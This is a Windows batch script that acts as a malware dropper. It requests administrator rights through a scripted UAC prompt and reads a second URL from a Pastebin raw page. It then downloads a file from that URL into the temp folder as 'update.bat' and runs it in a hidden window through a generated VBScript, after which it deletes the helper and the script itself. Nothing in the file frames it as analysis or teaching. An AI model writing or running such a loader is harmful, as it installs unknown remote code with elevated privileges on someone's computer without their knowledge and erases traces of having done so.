@echo off
powershell -window hidden -command ""

if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    echo SET UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    set pastebin_url=https://pastebin.com/raw/KQvUaT3q
	set update=%temp%\update.bat

	for /f "delims=" %%i in ('powershell -Command "(New-Object System.Net.WebClient).DownloadString('%pastebin_url%')"') do set actual_url=%%i
	powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%actual_url%', '%update%')"

	set vbs=%temp%\run_hidden.vbs
	echo Set WshShell = CreateObject("WScript.Shell") > "%vbs%"
	echo WshShell.Run """" ^& "%update%" ^& """", 0, False >> "%vbs%"

	cscript //nologo "%vbs%"

	del /f /q "%vbs%"
	del /f /q "%~f0"



